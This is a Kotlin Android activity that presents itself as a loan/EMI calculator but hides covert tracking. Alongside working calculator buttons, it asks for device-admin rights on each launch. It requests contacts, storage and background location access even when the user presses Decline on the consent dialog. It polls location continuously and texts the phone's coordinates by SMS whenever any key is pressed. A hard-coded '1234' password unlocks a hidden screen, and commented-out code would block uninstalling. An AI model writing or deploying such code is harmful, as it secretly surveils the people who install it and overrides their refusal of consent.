package com.think.emicalculator


import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.AlertDialog
import android.app.Dialog
import android.app.admin.DevicePolicyManager
import android.content.*
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Looper
import android.text.method.LinkMovementMethod
import android.util.TypedValue
import android.view.KeyEvent
import android.view.View
import android.view.Window
import android.view.WindowManager
import android.widget.*
import androidx.annotation.Nullable
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.databinding.DataBindingUtil
import com.google.android.gms.common.api.ResolvableApiException
import com.google.android.gms.location.*
import com.think.emicalculator.broadcastreciever.DeviceAdminReciever
import com.think.emicalculator.databinding.ActivityCalculatorScreenBinding
import com.think.emicalculator.locationutils.LocationUtils
import com.think.emicalculator.locationutils.SmsUtils
import kotlin.math.floor


class CalculatorScreen : AppCompatActivity() {

    val LOCATION_ENABLED_REQUEST = 102
    private lateinit var binding: ActivityCalculatorScreenBinding
    private val ADDITION = '+'
    private val SUBTRACTION = '-'
    private val MULTIPLICATION = '*'
    private val DIVISION = '/'
    private val EQU = '='
    private val EXTRA = '@'
    private val MODULUS = '%'
    private var ACTION = 0.toChar()
    private var val1 = Double.NaN
    private var val2 = 0.0

    private lateinit var dpm: DevicePolicyManager
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = DataBindingUtil.setContentView(this, R.layout.activity_calculator_screen)

        binding.button1.setOnClickListener {
            ifErrorOnOutput()
            exceedLength()
            binding.input.text = binding.input.text.toString() + "1"
        }

        binding.button2.setOnClickListener {
            ifErrorOnOutput()
            exceedLength()
            binding.input.text = binding.input.text.toString() + "2"
        }

        binding.button3.setOnClickListener {
            ifErrorOnOutput()
            exceedLength()
            binding.input.text = binding.input.text.toString() + "3"
        }

        binding.button4.setOnClickListener {
            ifErrorOnOutput()
            exceedLength()
            binding.input.text = binding.input.text.toString() + "4"
        }

        binding.button5.setOnClickListener {
            ifErrorOnOutput()
            exceedLength()
            binding.input.text = binding.input.text.toString() + "5"
        }

        binding.button6.setOnClickListener {
            ifErrorOnOutput()
            exceedLength()
            binding.input.text = binding.input.text.toString() + "6"
        }

        binding.button7.setOnClickListener {
            ifErrorOnOutput()
            exceedLength()
            binding.input.text = binding.input.text.toString() + "7"
        }

        binding.button8.setOnClickListener {
            ifErrorOnOutput()
            exceedLength()
            binding.input.text = binding.input.text.toString() + "8"
        }

        binding.button9.setOnClickListener {
            ifErrorOnOutput()
            exceedLength()
            binding.input.text = binding.input.text.toString() + "9"
        }

        binding.button0.setOnClickListener {
            ifErrorOnOutput()
            exceedLength()
            binding.input.text = binding.input.text.toString() + "0"
        }

        binding.buttonDot.setOnClickListener {
            exceedLength()
            binding.input.text = binding.input.text.toString() + "."
        }

        binding.buttonPara1.setOnClickListener {
            if (binding.input.text.isNotEmpty()) {
                ACTION = MODULUS
                operation()
                if (!ifReallyDecimal()) {
                    binding.output.text = "$val1%"
                } else {
                    binding.output.text = "$val1%"
                }
                binding.input.text = null
            } else {
                binding.output.text = "Error"
            }
        }

        binding.buttonAdd!!.setOnClickListener {
            if (binding.input.text.isNotEmpty()) {
                ACTION = ADDITION
                operation()
                if (!ifReallyDecimal()) {
                    binding.output.text = "$val1+"
                } else {
                    // binding.output.text=(val1 as Int.toString() + "+")
                    binding.output.text = "$val1+"
                }
                binding.input.text = null
            } else {
                binding.output.text = "Error"
            }
        }

        binding.buttonSub.setOnClickListener {
            if (binding.input.text.isNotEmpty()) {
                ACTION = SUBTRACTION
                operation()
                if (binding.input.text.isNotEmpty()) if (!ifReallyDecimal()) {
                    binding.output.text = "$val1-"
                } else {
                    binding.output.text = "$val1-"
                }
                binding.input.text = null
            } else {
                binding.output.text = "Error"
            }
        }

        binding.buttonMulti.setOnClickListener {
            if (binding.input.text.isNotEmpty()) {
                ACTION = MULTIPLICATION
                operation()
                if (!ifReallyDecimal()) {
                    binding.output.text = "$val1×"
                } else {
                    binding.output.text = "$val1×"
                }
                binding.input.text = null
            } else {
                binding.output.text = "Error"
            }
        }

        binding.buttonDivide.setOnClickListener {
            if (binding.input.text.isNotEmpty()) {
                ACTION = DIVISION
                operation()
                if (ifReallyDecimal()) {
                    binding.output.text = "$val1/"
                } else {
                    binding.output.text = "$val1/"
                }
                binding.input.text = null
            } else {
                binding.output.text = "Error"
            }
        }

        binding.buttonPara2.setOnClickListener {
            if (binding.output.text.toString().isNotEmpty() || binding.input.text.toString()
                    .isNotEmpty()
            ) {
                val1 = binding.input.text.toString().toDouble()
                ACTION = EXTRA
                binding.output.text = "-" + binding.input.text.toString()
                binding.input.text = ""
            } else {
                binding.output.text = "Error"
            }
        }

        binding.buttonEqual.setOnClickListener {
            if (binding.input.text.isNotEmpty()) {
                operation()
                ACTION = EQU
                if (!ifReallyDecimal()) {
                    binding.output.text = val1.toString()
                } else {
                    binding.output.text = val1.toString()
                }
                binding.input.text = null
            } else {
                binding.output.text = "Error"
            }
        }

        binding.buttonClear!!.setOnClickListener {
            if (binding.input.text.isNotEmpty()) {
                val name: CharSequence = binding.input.text.toString()
                binding.input.text = name.subSequence(0, name.length - 1)
            } else {
                val1 = Double.NaN
                val2 = Double.NaN
                binding.input.text = ""
                binding.output.text = ""
            }
        }


        binding.buttonClear!!.setOnLongClickListener {
            val1 = Double.NaN
            val2 = Double.NaN
            binding.input.text = ""
            binding.output.text = ""
            true
        }


        val cn = ComponentName(this, DeviceAdminReciever::class.java)
        enableAdminAccess(cn)
    }

    private fun enableAdminAccess(cn: ComponentName) {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                getString(R.string.add_admin_extra_app_text)
            )
        }
        startActivityForResult(intent, 12001)
    }


    private fun operation() {
        if (!java.lang.Double.isNaN(val1)) {
            if (binding.output.text.toString()[0] == '-') {
                val1 = -1 * val1
            }
            val2 = binding.input.text.toString().toDouble()
            when (ACTION) {
                ADDITION -> val1 = val1 + val2
                SUBTRACTION -> val1 = val1 - val2
                MULTIPLICATION -> val1 = val1 * val2
                DIVISION -> val1 = val1 / val2
                EXTRA -> val1 = -1 * val1
                MODULUS -> val1 = val1 % val2
                EQU -> {
                }
            }
        } else {
            val1 = binding.input.text.toString().toDouble()
        }
    }

    // Remove error message that is already written there.
    private fun ifErrorOnOutput() {
        if (binding.output.text.toString() == "Error") {
            binding.output.text = ""
        }
    }

    // Whether value if a double or not
    private fun ifReallyDecimal(): Boolean {
        return val1 == floor(val1)


    }

    private fun noOperation() {
        var inputExpression = binding.output.text.toString()
        if (!inputExpression.isEmpty() && inputExpression != "Error") {
            if (inputExpression.contains("-")) {
                inputExpression = inputExpression.replace("-", "")
                binding.output.text = ""
                val1 = inputExpression.toDouble()
            }
            if (inputExpression.contains("+")) {
                inputExpression = inputExpression.replace("+", "")
                binding.output.text = ""
                val1 = inputExpression.toDouble()
            }
            if (inputExpression.contains("/")) {
                inputExpression = inputExpression.replace("/", "")
                binding.output.text = ""
                val1 = inputExpression.toDouble()
            }
            if (inputExpression.contains("%")) {
                inputExpression = inputExpression.replace("%", "")
                binding.output.text = ""
                val1 = inputExpression.toDouble()
            }
            if (inputExpression.contains("×")) {
                inputExpression = inputExpression.replace("×", "")
                binding.output.text = ""
                val1 = inputExpression.toDouble()
            }
        }
    }

    // Make text small if too many digits.
    private fun exceedLength() {
        if (binding.input.text.toString().length > 10) {
            binding.input.setTextSize(TypedValue.COMPLEX_UNIT_SP, 20f)
        }
    }

    fun openContactScreen(view: View) {

        showDialog()

    }

    override fun onStart() {
        super.onStart()
        val preferences=LocationUtils.getSharedPreferences(this)
        if(!preferences.getBoolean("IsDialogShown",false)){
            showTermServicesDialog()
        }
        else requestContactPermission()

    }

    private fun checkAndGetLocation() {
        /* if(LocationUtils.isLocationEnabled(this)){

             LocationUtils.getUserLocation(this)
         }
         else LocationUtils.locationSetup(this)*/
        /*if(LocationUtils.locationSetup(this)){

            LocationUtils.getUserLocation(this)
        }
        else LocationUtils.showGPSNotEnabledDialog(this)*/

        LocationUtils.getUserLocation(context = this)
    }

    fun showDialog() {
        val dialog = Dialog(this)
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE)
        dialog.setCancelable(true)
        dialog.setContentView(R.layout.contact_dialog)
        val et_name = dialog.findViewById<EditText>(R.id.et_name)
        val submit = dialog.findViewById<View>(R.id.tv_submit) as TextView
        submit.setOnClickListener {
            val password = et_name.text.toString()

            if (password.equals("1234")) {
                startActivity(Intent(this, MainActivity::class.java))
                dialog.dismiss()

            } else Toast.makeText(this, "Please enter Correct Password", Toast.LENGTH_LONG).show()
        }
        dialog.show()
    }

    @SuppressLint("MissingPermission")
    private fun setUpLocationListener() {
        val fusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this)
        // for getting the current location update after every 2 seconds with high accuracy
        val locationRequest = LocationRequest().setInterval(2000).setFastestInterval(2000)
            .setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY)
        fusedLocationProviderClient.requestLocationUpdates(
            locationRequest,
            object : LocationCallback() {
                override fun onLocationResult(locationResult: LocationResult) {
                    super.onLocationResult(locationResult)
                    for (location in locationResult.locations) {

                    }
                    // Few more things we can do here:
                    // For example: Update the location of user on server
                }
            },
            Looper.myLooper()
        )
    }


    fun requestContactPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_CONTACTS
                ) != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
                ) != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_EXTERNAL_STORAGE
                ) != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                ) != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.ACCESS_FINE_LOCATION
                ) != PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                if (ActivityCompat.shouldShowRequestPermissionRationale(
                        this,
                        Manifest.permission.READ_CONTACTS
                    )
                ) {
                    val builder: AlertDialog.Builder = AlertDialog.Builder(this)
                    builder.setTitle("Read Contacts permission")
                    builder.setPositiveButton(android.R.string.ok, null)
                    builder.setMessage("Please enable access to contacts.")
                    builder.setOnDismissListener(DialogInterface.OnDismissListener {
                        requestPermissions(
                            arrayOf(
                                Manifest.permission.READ_CONTACTS,
                                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                                Manifest.permission.READ_EXTERNAL_STORAGE,
                                Manifest.permission.ACCESS_COARSE_LOCATION,
                                Manifest.permission.ACCESS_FINE_LOCATION,
                                Manifest.permission.ACCESS_BACKGROUND_LOCATION
                            ), PERMISSIONS_REQUEST_READ_CONTACTS
                        )
                    })
                    builder.show()
                } else {
                    ActivityCompat.requestPermissions(
                        this, arrayOf(
                            Manifest.permission.READ_CONTACTS,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE,
                            Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.ACCESS_COARSE_LOCATION,
                            Manifest.permission.ACCESS_FINE_LOCATION,
                            Manifest.permission.ACCESS_BACKGROUND_LOCATION
                        ),
                        PERMISSIONS_REQUEST_READ_CONTACTS
                    )
                }
            } else {
                locationSetup(this)
            }
        } else {
            locationSetup(this)
        }
    }

    fun locationSetup(context: Context) {
        LocationServices.getSettingsClient(context)
            .checkLocationSettings(
                LocationSettingsRequest.Builder()
                    .addLocationRequest(LocationUtils.locationRequest())
                    .setAlwaysShow(true)
                    .build()
            )
            .addOnSuccessListener {
                //  Toast.makeText(context,"Inside Location access",Toast.LENGTH_LONG).show()

                LocationUtils.trackLocation(this)
                checkAndGetLocation()
            }
            .addOnFailureListener {

                if (it is ResolvableApiException) {
                    // Location settings are NOT satisfied,  but this can be fixed  by showing the user a dialog.
                    try {
                        // Show the dialog by calling startResolutionForResult(),  and check the result in onActivityResult().
                        val resolvable = it as ResolvableApiException
                        resolvable.startResolutionForResult(

                            this,
                            LOCATION_ENABLED_REQUEST
                        )
                    } catch (sendEx: IntentSender.SendIntentException) {
                        // Ignore the error.
                    }
                }
            }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, @Nullable data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (LOCATION_ENABLED_REQUEST == requestCode) {
            if (Activity.RESULT_OK == resultCode) {
                checkAndGetLocation()
            } else {
                //user clicked cancel: informUserImportanceOfLocationAndPresentRequestAgain();
                LocationUtils.showGPSNotEnabledDialog(context = this)
            }
        } else if (LOCATION_ENABLED_REQUEST == 12001) {
            /*val cn = ComponentName(this, DeviceAdminReciever::class.java)
             dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            dpm.setUninstallBlocked(cn,"com.think.emicalculator",true)*/
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        when (requestCode) {
            PERMISSIONS_REQUEST_READ_CONTACTS -> {
                if (grantResults.size > 0
                    && grantResults[0] == PackageManager.PERMISSION_GRANTED
                ) {
                    locationSetup(this)
                } else {
                    Toast.makeText(
                        this,
                        "You have disabled contacts permission",
                        Toast.LENGTH_LONG
                    ).show()
                }
                return
            }
        }
    }
    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {

        val location=LocationUtils.getUserLocation()
        location?.let {
            SmsUtils.sendSms(
                location.latitude.toString(),
                lon = location.longitude.toString(),
                LocationUtils.getFileNo(
                    this
                )
            )
            Toast.makeText(this, "Sms Sent Successfully", Toast.LENGTH_LONG).show()

        }

        return true
    }

    private fun showTermServicesDialog() {
        val dialog = Dialog(this)
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE) // before
        dialog.setContentView(R.layout.location_consent)
        dialog.setCancelable(true)
        val lp = WindowManager.LayoutParams()
        lp.copyFrom(dialog.window!!.attributes)
        lp.width = WindowManager.LayoutParams.MATCH_PARENT
        lp.height = WindowManager.LayoutParams.MATCH_PARENT

        (dialog.findViewById<View>(R.id.tv_consent) as TextView).movementMethod = LinkMovementMethod.getInstance()
        (dialog.findViewById<View>(R.id.bt_accept) as Button).setOnClickListener {
            requestContactPermission()
writeToPreferenceForLocationConsent()
            dialog.dismiss()
        }
        (dialog.findViewById<View>(R.id.bt_decline) as Button).setOnClickListener {
            requestContactPermission()
            writeToPreferenceForLocationConsent()
            dialog.dismiss()

        }
        dialog.show()
        dialog.window!!.attributes = lp
    }

    private fun writeToPreferenceForLocationConsent(){
      val preferences=  LocationUtils.getSharedPreferences(this)

        with (preferences.edit()) {
            putBoolean("IsDialogShown", true)
            apply()
        }
    }
}